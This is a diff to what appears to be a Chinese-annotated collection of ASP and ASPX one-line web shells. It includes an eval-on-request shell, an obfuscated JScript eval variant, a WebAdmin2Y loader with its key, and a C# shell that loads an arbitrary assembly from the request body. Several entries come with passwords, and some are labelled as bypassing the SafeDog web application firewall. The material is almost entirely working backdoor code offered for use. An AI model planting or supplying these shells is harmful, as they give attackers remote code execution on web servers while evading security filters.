@@ -15,16 +15,20 @@ ms.ExecuteStatement("ev"&"al(request(""8090sec""))")
 (/*-/*-*/P/*-/*-*/,/*-/*-*/"u"+"n"+"s"/*-/*-*/+"a"+"f"+"e"/*-/*-*/);%>    密码   -7
  
 ●════════════════════════════════════════════════════════════════════════════════●  
+
 <script language="C#" runat="server">
 WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10");
 </script>
 
 密码是webadmin
 
+●════════════════════════════════════════════════════════════════════════════════●  
  
 <script language="C#" runat="server">           
 WebAdmin2Y.x.y aaaaa = new WebAdmin2Y.x.y("add6bb58e139be10");            
 </script>                                                             密码是webadmin
+
+●════════════════════════════════════════════════════════════════════════════════●  
 
 <%@ Page Language="Jscript" validateRequest="false" %>
 <%
@@ -34,8 +38,10 @@ Response.Write(eval(keng,"unsafe"));
 %>
 过狗
 
-
+●════════════════════════════════════════════════════════════════════════════════●  
 
 突破安全狗的aspx一句话：
 <%@ Page Language="C#" ValidateRequest="false" %>
 <%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies["你的密码"].Value))).CreateInstance("c", true, System.Reflection.BindingFlags.Default, null, new object[] { this }, null, null); } catch { }%>
+
+●════════════════════════════════════════════════════════════════════════════════●  
